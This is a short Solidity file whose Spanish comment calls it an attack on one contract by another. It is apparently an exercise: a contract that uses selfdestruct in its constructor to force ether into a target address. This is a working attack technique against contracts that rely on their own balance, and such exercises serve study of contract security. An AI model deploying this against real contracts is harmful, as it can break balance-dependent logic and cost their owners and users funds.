// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;


//Atacar un contrato con otro contrato
contract forceEther {
    constructor(address payable objective) payable {
        selfdestruct(objective);
    }
}
